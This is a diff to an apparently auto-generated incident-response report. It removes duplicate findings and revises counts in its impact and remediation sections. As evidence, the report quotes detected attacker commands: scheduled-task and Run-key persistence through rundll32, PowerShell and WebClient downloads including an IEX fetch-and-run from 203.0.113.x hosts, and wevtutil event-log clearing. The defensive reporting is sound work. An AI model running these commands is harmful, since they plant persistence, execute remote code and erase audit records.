@@ -180,7 +180,6 @@ Impact
       what     RunKeyPersistence: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
                ScheduledTaskCreation: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
                ScheduledTaskCreation: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
-               schtasks: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
       basis    RunKeyPersistence, ScheduledTaskCreation, Persistence tools
   [x] Outside hosts contacted
       Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 203.0.113.10, 203.0.113.20, 203.0.113.30.
@@ -191,7 +190,7 @@ Impact
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 5 more in report.json
+               and 4 more in report.json
       basis    FileDownload, DownloadAndExecute, NetworkSocket
   [x] Defences and logging impaired
       Logs were cleared or security tooling was interfered with. Records of this period are incomplete.
@@ -199,7 +198,6 @@ Impact
       what     EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)
                EventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)
                EventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)
-               wevtutil: wevtutil cl Security (proc_20261020_103500.jsonl)
       basis    EventLogClearing, DefenseImpairment tools
   [!] Code run outside normal controls
       Code was run in ways that avoid application control and leave little on disk.
@@ -233,7 +231,6 @@ Remediation   (most urgent first)
       what     RunKeyPersistence: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "rundll32.exe C:\Users\Public\a.dll,Start" /f (20261020_101500_step04_persist.ps1:2)
                ScheduledTaskCreation: schtasks.exe /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (20261020_101500_step04_persist.ps1:1)
                ScheduledTaskCreation: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
-               schtasks: schtasks /create /tn Updater /tr "rundll32.exe C:\Users\Public\a.dll,Start" /sc onlogon /f (proc_20261020_103500.jsonl)
       basis    RunKeyPersistence, ScheduledTaskCreation, Persistence tools
   [x] Block and hunt the infrastructure
       Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.
@@ -244,7 +241,7 @@ Remediation   (most urgent first)
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 5 more in report.json
+               and 4 more in report.json
       basis    FileDownload, DownloadAndExecute, NetworkSocket
   [!] Find the delivered files
       Collect the files that were downloaded, dropped or loaded, hash them, and search every host for the same hashes.
@@ -255,7 +252,7 @@ Remediation   (most urgent first)
                FileDownload: public override bool Execute() { new WebClient().DownloadFile("http://203.0.113.10/d.bin", "d.bin"); return true; } (build_20261020_101200.xml)
                FileDownload: $b64 = $wc.DownloadString("http://203.0.113.20/stage.txt") (20261020_102000_step05_dotnet.ps1:2)
                FileDownload: IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.20/next.ps1") (20261020_102500_step06_pinvoke.ps1:12)
-               and 20 more in report.json
+               and 18 more in report.json
       basis    FileDownload, DownloadAndExecute, ReflectiveCodeLoading, SignedBinaryProxyExecution, RuntimeCompilation, NativeApiCall, ProcessStart
   [!] Recover the missing logs
       Treat local logs as incomplete, and recover the period from a central collector or a backup.
@@ -263,7 +260,6 @@ Remediation   (most urgent first)
       what     EventLogClearing: wevtutil cl Security (20261020_101500_step04_persist.ps1:3)
                EventLogClearing: wevtutil cl System (20261020_103000_step07_cleanup.bat:3)
                EventLogClearing: wevtutil cl Security (proc_20261020_103500.jsonl)
-               wevtutil: wevtutil cl Security (proc_20261020_103500.jsonl)
       basis    EventLogClearing, DefenseImpairment tools
   [i] Follow what was enumerated
       Use what was listed to predict targets: check those identities, vaults and hosts for later activity.
